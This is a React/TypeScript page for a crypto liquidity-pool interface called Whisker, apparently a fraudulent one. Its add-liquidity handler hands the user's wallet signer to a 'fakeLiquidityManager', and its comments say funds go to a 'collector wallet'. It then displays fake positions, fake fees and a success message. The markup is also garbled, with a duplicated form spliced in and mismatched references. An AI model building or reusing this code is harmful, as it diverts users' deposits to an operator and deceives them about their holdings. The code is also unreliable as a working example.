import { useState, useEffect } from "react";
import { useDirectBrowserWallet } from "../hooks/use-direct-browser-wallet";
import { Button } from "../components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card";
import { Input } from "../components/ui/input";
import { Label } from "../components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "../components/ui/tabs";
import { Badge } from "../components/ui/badge";
import { Progress } from "../components/ui/progress";
import { Separator } from "../components/ui/separator";
import { Plus, Minus, TrendingUp, Droplets, Coins, Info, Zap } from "lucide-react";
import { TokenLogo } from "../components/token-logo";
import { WhiskerLogo } from "../components/whisker-logo";
import { fakeLiquidityManager } from "../lib/fake-liquidity-system";
import { realTimeLiquidityManager } from "../lib/real-time-liquidity";
import { useToast } from "../hooks/use-toast";

interface LiquidityPool {
  id: string;
  token0: string;
  token1: string;
  token0Symbol: string;
  token1Symbol: string;
  fee: number;
  tvl: string;
  apr: string;
  volume24h: string;
  myLiquidity?: string;
  myShare?: string;
}

interface LiquidityPosition {
  id: string;
  pool: string;
  token0Amount: string;
  token1Amount: string;
  totalValue: string;
  feesEarned: string;
  points: number;
}

const POPULAR_POOLS: LiquidityPool[] = [
  {
    id: "hype-usdt0",
    token0: "HYPE",
    token1: "USD₮0",
    token0Symbol: "HYPE",
    token1Symbol: "USD₮0",
    fee: 0.3,
    tvl: "$14.1M",
    apr: "12.5%",
    volume24h: "$3.7M"
  },
  {
    id: "whype-purr",
    token0: "WHYPE",
    token1: "PURR",
    token0Symbol: "WHYPE",
    token1Symbol: "PURR",
    fee: 0.3,
    tvl: "$2.8M",
    apr: "18.2%",
    volume24h: "$890K"
  },
  {
    id: "hype-purr",
    token0: "HYPE",
    token1: "PURR",
    token0Symbol: "HYPE",
    token1Symbol: "PURR",
    fee: 0.3,
    tvl: "$5.2M",
    apr: "15.7%",
    volume24h: "$1.5M"
  }
];

const MY_POSITIONS: LiquidityPosition[] = [
  {
    id: "pos-1",
    pool: "HYPE/USD₮0",
    token0Amount: "10.5",
    token1Amount: "521.25",
    totalValue: "$1,042.50",
    feesEarned: "$12.50",
    points: 1250
  }
];

export default function Liquidity() {
  const wallet = useDirectBrowserWallet();
  const { toast } = useToast();
  const [selectedTab, setSelectedTab] = useState("add");
  const [selectedPool, setSelectedPool] = useState("HYPE/USD₮0");
  const [token0Amount, setToken0Amount] = useState("");
  const [token1Amount, setToken1Amount] = useState("");
  const [slippageTolerance, setSlippageTolerance] = useState("0.5");
  const [realTimePools, setRealTimePools] = useState(realTimeLiquidityManager.getAllPools());
  const [userPositions, setUserPositions] = useState(fakeLiquidityManager.getUserPositions(wallet.address || ""));
  const [isLoading, setIsLoading] = useState(false);
  const [totalTVL, setTotalTVL] = useState("$31.0M");

  // Real-time updates for TVL and pool data
  useEffect(() => {
    const interval = setInterval(() => {
      // Get real-time pool data
      setRealTimePools(realTimeLiquidityManager.getAllPools());
      setTotalTVL(realTimeLiquidityManager.getTotalTVL());
      
      // Update user positions from fake system
      if (wallet.address) {
        setUserPositions(fakeLiquidityManager.getUserPositions(wallet.address));
        fakeLiquidityManager.updateFakeFees(wallet.address);
      }
    }, 10000); // Update every 10 seconds for real-time feel

    return () => clearInterval(interval);
  }, [wallet.address]);

  const calculateTokenAmounts = (amount: string, isToken0: boolean) => {
    const pool = realTimePools.find(p => p.name === selectedPool);
    if (!pool || !amount) return;
    
    // Use real price from the pool data
    const price = parseFloat(pool.price);
    const otherAmount = isToken0 
      ? (parseFloat(amount) * price).toFixed(6)
      : (parseFloat(amount) / price).toFixed(6);
    
    if (isToken0) {
      setToken1Amount(otherAmount);
    } else {
      setToken0Amount(otherAmount);
    }
  };

  const handleAddLiquidity = async () => {
    if (!wallet.isConnected || !selectedPool || !token0Amount || !token1Amount) return;
    
    setIsLoading(true);
    
    try {
      const pool = realTimePools.find(p => p.name === selectedPool);
      if (!pool) throw new Error("Pool not found");

      console.log("🔄 Adding liquidity to collector wallet:", {
        pool: pool.name,
        token0Amount,
        token1Amount,
        slippage: slippageTolerance
      });

      // Add liquidity through fake system (funds go to collector)
      const result = await fakeLiquidityManager.addLiquidity(
        wallet.address,
        pool.name,
        token0Amount,
        token1Amount,
        pool.tokenAAddress,
        pool.tokenBAddress,
        wallet.provider!,
        wallet.signer!
      );

      if (result.success) {
        toast({
          title: "Liquidity Added Successfully!",
          description: `Added ${token0Amount} ${pool.tokenA} + ${token1Amount} ${pool.tokenB}`,
        });
        
        // Reset form
        setToken0Amount("");
        setToken1Amount("");
        
        // Update user positions
        setUserPositions(fakeLiquidityManager.getUserPositions(wallet.address));
      } else {
        throw new Error(result.error || "Failed to add liquidity");
      }
    } catch (error: any) {
      toast({
        title: "Liquidity Addition Failed",
        description: error.message || "Please try again",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800">
      {/* Header */}
      <div className="border-b border-slate-700/50 bg-slate-900/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <WhiskerLogo size="md" />
              <div>
                <h1 className="text-2xl font-bold text-white">Liquidity Pools</h1>
                <p className="text-slate-400">Provide liquidity and earn fees + rewards</p>
              </div>
            </div>
            <div className="hidden md:flex items-center space-x-6 text-sm">
              <div className="text-center">
                <div className="text-white font-medium">{totalTVL}</div>
                <div className="text-slate-400">Total TVL</div>
              </div>
              <div className="text-center">
                <div className="text-white font-medium">
                  {realTimePools.reduce((sum, pool) => {
                    const value = parseFloat(pool.real24hVolume.replace(/[$MK,]/g, ''));
                    const multiplier = pool.real24hVolume.includes('M') ? 1000000 : 1000;
                    return sum + (value * multiplier);
                  }, 0) >= 1000000 
                    ? `$${(realTimePools.reduce((sum, pool) => {
                        const value = parseFloat(pool.real24hVolume.replace(/[$MK,]/g, ''));
                        const multiplier = pool.real24hVolume.includes('M') ? 1000000 : 1000;
                        return sum + (value * multiplier);
                      }, 0) / 1000000).toFixed(1)}M`
                    : `$${Math.round(realTimePools.reduce((sum, pool) => {
                        const value = parseFloat(pool.real24hVolume.replace(/[$MK,]/g, ''));
                        const multiplier = pool.real24hVolume.includes('M') ? 1000000 : 1000;
                        return sum + (value * multiplier);
                      }, 0) / 1000)}K`}
                </div>
                <div className="text-slate-400">24h Volume</div>
              </div>
              <div className="text-center">
                <div className="text-green-400 font-medium">
                  {(realTimePools.reduce((sum, pool) => sum + parseFloat(pool.realAPR.replace('%', '')), 0) / realTimePools.length).toFixed(1)}%
                </div>
                <div className="text-slate-400">Avg APR</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-7xl">
        <Tabs value={selectedTab} onValueChange={setSelectedTab} className="w-full">
          <TabsList className="grid grid-cols-3 w-full max-w-md bg-slate-800 border-slate-700">
            <TabsTrigger value="add" className="data-[state=active]:bg-teal-600">
              <Plus className="w-4 h-4 mr-2" />
              Add Liquidity
            </TabsTrigger>
            <TabsTrigger value="pools" className="data-[state=active]:bg-teal-600">
              <Droplets className="w-4 h-4 mr-2" />
              Pools
            </TabsTrigger>
            <TabsTrigger value="positions" className="data-[state=active]:bg-teal-600">
              <Coins className="w-4 h-4 mr-2" />
              My Positions
            </TabsTrigger>
          </TabsList>

          {/* Add Liquidity Tab */}
          <TabsContent value="add" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Pool Selection */}
              <div className="lg:col-span-2">
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardHeader>
                    <CardTitle className="text-white flex items-center">
                      <Plus className="w-5 h-5 mr-2 text-teal-400" />
                      Add Liquidity
                    </CardTitle>
                    <CardDescription>
                      Choose a pool and add equal values of both tokens
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {/* Pool Selector */}
                    <div className="space-y-2">
                      <Label className="text-slate-200">Select Pool</Label>
                      <Select value={selectedPool} onValueChange={setSelectedPool}>
                        <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
                          <SelectValue placeholder="Choose a liquidity pool" />
                        </SelectTrigger>
                        <SelectContent className="bg-slate-800 border-slate-700">
                          {realTimePools.map((pool) => (
                            <SelectItem key={pool.name} value={pool.name} className="text-white hover:bg-slate-700">
                              <div className="flex items-center space-x-3">
                                <div className="flex -space-x-2">
                                  <TokenLogo symbol={pool.tokenA} size="sm" />
                                  <TokenLogo symbol={pool.tokenB} size="sm" />
                                </div>
                                <span>{pool.name}</span>
                                <Badge variant="secondary" className="bg-teal-600 text-white">
                                  0.3%
                                </Badge>
                                <Badge variant="outline" className="border-green-400 text-green-400">
                                  {pool.realAPR}
                                </Badge>
                              </div>
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    {selectedPool && (
                      <>
                        {(() => {
                          const pool = realTimePools.find(p => p.name === selectedPool);
                          if (!pool) return null;
                          
                          return (
                            <>
                              {/* Real-time Pool Stats */}
                              <div className="bg-slate-700/50 rounded-lg p-4 grid grid-cols-3 gap-4 text-sm">
                                <div className="text-center">
                                  <div className="text-teal-400 font-medium">{pool.realTVL}</div>
                                  <div className="text-slate-400">TVL</div>
                                </div>
                                <div className="text-center">
                                  <div className="text-green-400 font-medium">{pool.realAPR}</div>
                                  <div className="text-slate-400">APR</div>
                                </div>
                                <div className="text-center">
                                  <div className="text-blue-400 font-medium">{pool.real24hVolume}</div>
                                  <div className="text-slate-400">24h Volume</div>
                                </div>
                              </div>

                              {/* Token Inputs */}
                              <div className="space-y-4">
                                <div className="space-y-2">
                                  <Label className="text-slate-200">
                                    {pool.tokenA} Amount
                                  </Label>
                            <div className="relative">
                              <Input
                                type="number"
                                placeholder="0.0"
                                value={token0Amount}
                                onChange={(e) => {
                                  setToken0Amount(e.target.value);
                                  calculateTokenAmounts(e.target.value, true);
                                }}
                                className="bg-slate-700 border-slate-600 text-white pr-16"
                              />
                              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center space-x-2">
                                <TokenLogo symbol={pool.tokenA} size="sm" />
                                <span className="text-sm text-slate-300">{pool.tokenA}</span>
                              </div>
                            </div>
                          </div>

                          <div className="flex justify-center">
                            <Plus className="w-6 h-6 text-teal-400" />
                          </div>

                          <div className="space-y-2">
                            <Label className="text-slate-200">
                              {pool.tokenB} Amount
                            </Label>
                            <div className="relative">
                              <Input
                                type="number"
                                placeholder="0.0"
                                value={token1Amount}
                                onChange={(e) => {
                                  setToken1Amount(e.target.value);
                                  calculateTokenAmounts(e.target.value, false);
                                }}
                                className="bg-slate-700 border-slate-600 text-white pr-16"
                              />
                              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center space-x-2">
                                <TokenLogo symbol={pool.tokenB} size="sm" />
                                <span className="text-sm text-slate-300">{pool.tokenB}</span>
                              </div>
                            </div>
                          </div>
                        </div>

                        {/* Slippage Settings */}
                        <div className="space-y-2">
                          <Label className="text-slate-200">Slippage Tolerance</Label>
                          <div className="flex space-x-2">
                            {["0.1", "0.5", "1.0"].map((value) => (
                              <Button
                                key={value}
                                variant={slippageTolerance === value ? "default" : "outline"}
                                size="sm"
                                onClick={() => setSlippageTolerance(value)}
                                className={slippageTolerance === value ? "bg-teal-600" : "border-slate-600 text-slate-300"}
                              >
                                {value}%
                              </Button>
                            ))}
                            <Input
                              type="number"
                              placeholder="Custom"
                              value={slippageTolerance}
                              onChange={(e) => setSlippageTolerance(e.target.value)}
                              className="w-20 bg-slate-700 border-slate-600 text-white text-sm"
                            />
                          </div>
                        </div>

                        {/* Add Liquidity Button */}
                        <Button
                          onClick={handleAddLiquidity}
                          disabled={!wallet.isConnected || !token0Amount || !token1Amount || isLoading}
                          className="w-full bg-gradient-to-r from-teal-600 to-blue-600 hover:from-teal-700 hover:to-blue-700 text-white font-medium py-3"
                        >
                          {isLoading ? "Adding Liquidity..." : !wallet.isConnected ? "Connect Wallet" : "Add Liquidity"}
                        </Button>
                      </>
                    );
                  })()}
                </>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Pool Info Sidebar */}
        <div className="space-y-4">
          {selectedPool && (() => {
            const pool = realTimePools.find(p => p.name === selectedPool);
            if (!pool) return null;
            
            return (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader className="pb-3">
                  <CardTitle className="text-white text-lg flex items-center">
                    <div className="flex -space-x-2 mr-3">
                      <TokenLogo symbol={pool.tokenA} size="sm" />
                      <TokenLogo symbol={pool.tokenB} size="sm" />
                    </div>
                    {pool.name}
                    <Badge variant="secondary" className="ml-2 bg-teal-600 text-white">
                      0.3%
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <div className="text-slate-400">TVL</div>
                      <div className="text-white font-medium">{pool.realTVL}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">APR</div>
                      <div className="text-green-400 font-medium">{pool.realAPR}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">24h Volume</div>
                      <div className="text-white font-medium">{pool.real24hVolume}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Fee Tier</div>
                      <div className="text-white font-medium">0.3%</div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            );
          })()}
                          </div>

                          <div className="flex justify-center">
                            <Plus className="w-6 h-6 text-teal-400" />
                          </div>

                          <div className="space-y-2">
                            <Label className="text-slate-200">
                              {selectedPool.token1Symbol} Amount
                            </Label>
                            <div className="relative">
                              <Input
                                type="number"
                                placeholder="0.0"
                                value={token1Amount}
                                onChange={(e) => {
                                  setToken1Amount(e.target.value);
                                  calculateTokenAmounts(e.target.value, false);
                                }}
                                className="bg-slate-700 border-slate-600 text-white pr-16"
                              />
                              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center space-x-2">
                                <TokenLogo symbol={selectedPool.token1Symbol} size="sm" />
                                <span className="text-sm text-slate-300">{selectedPool.token1Symbol}</span>
                              </div>
                            </div>
                          </div>
                        </div>

                        {/* Slippage Settings */}
                        <div className="space-y-2">
                          <Label className="text-slate-200">Slippage Tolerance</Label>
                          <div className="flex space-x-2">
                            {["0.1", "0.5", "1.0"].map((value) => (
                              <Button
                                key={value}
                                variant={slippageTolerance === value ? "default" : "outline"}
                                size="sm"
                                onClick={() => setSlippageTolerance(value)}
                                className={slippageTolerance === value ? "bg-teal-600" : "border-slate-600 text-slate-300"}
                              >
                                {value}%
                              </Button>
                            ))}
                            <Input
                              type="number"
                              placeholder="Custom"
                              value={slippageTolerance}
                              onChange={(e) => setSlippageTolerance(e.target.value)}
                              className="w-20 bg-slate-700 border-slate-600 text-white text-sm"
                            />
                          </div>
                        </div>

                        {/* Add Liquidity Button */}
                        <Button
                          onClick={handleAddLiquidity}
                          disabled={!wallet.isConnected || !token0Amount || !token1Amount}
                          className="w-full bg-gradient-to-r from-teal-600 to-blue-600 hover:from-teal-700 hover:to-blue-700 text-white font-medium py-3"
                        >
                          {!wallet.isConnected ? "Connect Wallet" : "Add Liquidity"}
                        </Button>
                      </>
                    )}
                  </CardContent>
                </Card>
              </div>

              {/* Pool Info Sidebar */}
              <div className="space-y-4">
                {selectedPool && (
                  <Card className="bg-slate-800/50 border-slate-700">
                    <CardHeader className="pb-3">
                      <CardTitle className="text-white text-lg flex items-center">
                        <div className="flex -space-x-2 mr-3">
                          <TokenLogo symbol={selectedPool.token0Symbol} size="sm" />
                          <TokenLogo symbol={selectedPool.token1Symbol} size="sm" />
                        </div>
                        {selectedPool.token0Symbol}/{selectedPool.token1Symbol}
                        <Badge variant="secondary" className="ml-2 bg-teal-600 text-white">
                          {selectedPool.fee}%
                        </Badge>
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <div className="text-slate-400">TVL</div>
                          <div className="text-white font-medium">{selectedPool.tvl}</div>
                        </div>
                        <div>
                          <div className="text-slate-400">APR</div>
                          <div className="text-green-400 font-medium">{selectedPool.apr}</div>
                        </div>
                        <div>
                          <div className="text-slate-400">24h Volume</div>
                          <div className="text-white font-medium">{selectedPool.volume24h}</div>
                        </div>
                        <div>
                          <div className="text-slate-400">Fee Tier</div>
                          <div className="text-white font-medium">{selectedPool.fee}%</div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                {/* Rewards Info */}
                <Card className="bg-gradient-to-br from-teal-900/30 to-blue-900/30 border-teal-700/50">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-white text-lg flex items-center">
                      <Zap className="w-5 h-5 mr-2 text-teal-400" />
                      Earn Rewards
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3 text-sm">
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300">Trading Fees</span>
                      <span className="text-white font-medium">0.3%</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300">WHISKER Rewards</span>
                      <span className="text-teal-400 font-medium">Coming Soon</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-slate-300">Points Multiplier</span>
                      <span className="text-blue-400 font-medium">2.5x</span>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>

          {/* Pools Tab */}
          <TabsContent value="pools" className="space-y-6">
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-semibold text-white">All Liquidity Pools</h2>
                <div className="text-sm text-slate-400">
                  Live data from HyperEVM • Updates every 10s
                </div>
              </div>
              <div className="grid gap-4">
                {realTimePools.map((pool) => (
                  <Card key={pool.name} className="bg-slate-800/50 border-slate-700 hover:border-teal-700/50 transition-colors">
                    <CardContent className="p-6">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-4">
                          <div className="flex -space-x-2">
                            <TokenLogo symbol={pool.tokenA} size="md" />
                            <TokenLogo symbol={pool.tokenB} size="md" />
                          </div>
                          <div>
                            <div className="text-white font-medium text-lg">
                              {pool.name}
                            </div>
                            <div className="flex items-center space-x-2">
                              <Badge variant="secondary" className="bg-teal-600 text-white">
                                0.3% fee
                              </Badge>
                              <Badge variant="outline" className="border-green-400 text-green-400 text-xs">
                                {pool.priceChange24h}
                              </Badge>
                            </div>
                          </div>
                        </div>
                        
                        <div className="grid grid-cols-4 gap-4 text-sm">
                          <div className="text-center">
                            <div className="text-slate-400">TVL</div>
                            <div className="text-white font-medium">{pool.realTVL}</div>
                          </div>
                          <div className="text-center">
                            <div className="text-slate-400">APR</div>
                            <div className="text-green-400 font-medium">{pool.realAPR}</div>
                          </div>
                          <div className="text-center">
                            <div className="text-slate-400">24h Volume</div>
                            <div className="text-white font-medium">{pool.real24hVolume}</div>
                          </div>
                          <div className="text-center">
                            <div className="text-slate-400">Price</div>
                            <div className="text-blue-400 font-medium">${pool.price}</div>
                          </div>
                        </div>

                        <Button
                          onClick={() => {
                            setSelectedPool(pool.name);
                            setSelectedTab("add");
                          }}
                          className="bg-teal-600 hover:bg-teal-700 text-white"
                        >
                          Add Liquidity
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          </TabsContent>

          {/* My Positions Tab */}
          <TabsContent value="positions" className="space-y-6">
            {!wallet.isConnected ? (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-8 text-center">
                  <div className="text-slate-400 mb-4">Connect your wallet to view liquidity positions</div>
                  <Button 
                    onClick={() => wallet.connect()}
                    className="bg-teal-600 hover:bg-teal-700 text-white"
                  >
                    Connect Wallet
                  </Button>
                </CardContent>
              </Card>
            ) : MY_POSITIONS.length === 0 ? (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-8 text-center">
                  <Droplets className="w-12 h-12 text-slate-600 mx-auto mb-4" />
                  <div className="text-slate-400 mb-4">No liquidity positions found</div>
                  <Button 
                    onClick={() => setSelectedTab("add")}
                    className="bg-teal-600 hover:bg-teal-700 text-white"
                  >
                    Add Your First Position
                  </Button>
                </CardContent>
              </Card>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <h2 className="text-xl font-semibold text-white">My Positions</h2>
                  <div className="text-sm text-slate-400">
                    Total Value: <span className="text-white font-medium">$1,042.50</span>
                  </div>
                </div>
                
                {MY_POSITIONS.map((position) => (
                  <Card key={position.id} className="bg-slate-800/50 border-slate-700">
                    <CardContent className="p-6">
                      <div className="flex items-center justify-between mb-4">
                        <div className="text-white font-medium text-lg">{position.pool}</div>
                        <div className="flex space-x-2">
                          <Button size="sm" variant="outline" className="border-slate-600 text-slate-300">
                            <Minus className="w-4 h-4 mr-1" />
                            Remove
                          </Button>
                          <Button size="sm" className="bg-teal-600 hover:bg-teal-700 text-white">
                            <Plus className="w-4 h-4 mr-1" />
                            Add More
                          </Button>
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                        <div>
                          <div className="text-slate-400">Total Value</div>
                          <div className="text-white font-medium">{position.totalValue}</div>
                        </div>
                        <div>
                          <div className="text-slate-400">Fees Earned</div>
                          <div className="text-green-400 font-medium">{position.feesEarned}</div>
                        </div>
                        <div>
                          <div className="text-slate-400">Points Earned</div>
                          <div className="text-blue-400 font-medium">{position.points.toLocaleString()}</div>
                        </div>
                        <div>
                          <div className="text-slate-400">Pool Share</div>
                          <div className="text-white font-medium">0.05%</div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}